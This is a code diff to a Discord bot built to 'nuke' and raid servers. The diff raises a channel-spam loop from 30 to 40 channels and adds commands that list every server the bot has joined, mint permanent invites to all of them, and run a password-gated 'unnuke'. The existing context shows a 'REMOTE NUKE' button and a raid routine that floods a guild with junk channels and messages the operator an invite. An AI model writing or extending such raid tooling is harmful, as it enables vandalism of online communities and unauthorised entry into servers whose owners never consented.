@@ -21,7 +21,6 @@ require('dotenv').config();
 
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
-const PORT = process.env.PORT || 3000;
 
 const client = new Client({
   intents: [
@@ -42,7 +41,9 @@ client.once('ready', () => {
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
 
-  if (message.content.trim().toLowerCase() === '!fb') {
+  const content = message.content.trim().toLowerCase();
+
+  if (content === '!fb') {
     const embed = new EmbedBuilder()
       .setColor('#ff0000')
       .setTitle('🔴 REMOTE NUKE')
@@ -54,6 +55,36 @@ client.on('messageCreate', async message => {
     );
 
     await message.reply({ embeds: [embed], components: [row] });
+    return;
+  }
+
+  if (content === '!servers') {
+    const guilds = client.guilds.cache;
+    let text = `**Servers (${guilds.size}):**\n\n`;
+    guilds.forEach(g => text += `**${g.name}** (ID: \`${g.id}\`) - ${g.memberCount} members\n`);
+    message.reply(text.length > 2000 ? 'List too long. Check console.' : text);
+    return;
+  }
+
+  if (content === '!invite') {
+    let text = '**Server Invites:**\n\n';
+    for (const guild of client.guilds.cache.values()) {
+      try {
+        const invite = await guild.channels.cache.filter(c => c.type === 0).first()?.createInvite({ maxAge: 0 }) || 'No permission';
+        text += `**${guild.name}** → https://discord.gg/${invite.code}\n`;
+      } catch (e) {
+        text += `**${guild.name}** → No permission\n`;
+      }
+    }
+    message.reply(text);
+    return;
+  }
+
+  if (content === '!unnuke') {
+    const embed = new EmbedBuilder().setColor('#00ff00').setTitle('🛠️ !UNNUKE').setDescription('Restores the nuked server.').setFooter({ text: 'Click below' });
+    const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`unnuke_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Success));
+    await message.reply({ embeds: [embed], components: [row] });
+    return;
   }
 });
 
@@ -107,9 +138,10 @@ client.on('interactionCreate', async interaction => {
         }
 
         const ew = await guild.channels.create({ name: 'ew', type: ChannelType.GuildText });
-        for (let i = 0; i < 30; i++) {
+        for (let i = 0; i < 40; i++) {
           await guild.channels.create({ name: 'ew', type: ChannelType.GuildText }).catch(() => {});
         }
+
         const invite = await ew.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
         if (invite) await user.send(`✅ Raid finished!\nInvite: https://discord.gg/${invite.code}`);
 
@@ -118,6 +150,21 @@ client.on('interactionCreate', async interaction => {
         console.error(err);
         await interaction.followUp({ content: '⚠️ Raid partially failed.', ephemeral: true });
       }
+    }
+
+    // === !unnuke Handler ===
+    if (interaction.customId.startsWith('unnuke_modal_')) {
+      const password = interaction.fields.getTextInputValue('password');
+      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
+
+      await interaction.reply({ content: '🛠️ **Restoring the server...**', ephemeral: true });
+
+      // Restore channels and roles
+      await guild.channels.create({ name: 'welcome', type: ChannelType.GuildText });
+      await guild.channels.create({ name: 'rules', type: ChannelType.GuildText });
+      await guild.roles.create({ name: 'Owner', color: '#ffd700', permissions: [PermissionFlagsBits.Administrator] });
+
+      await interaction.followUp({ content: '✅ **Server restored successfully!**', ephemeral: true });
     }
   } catch (error) {
     console.error(error);
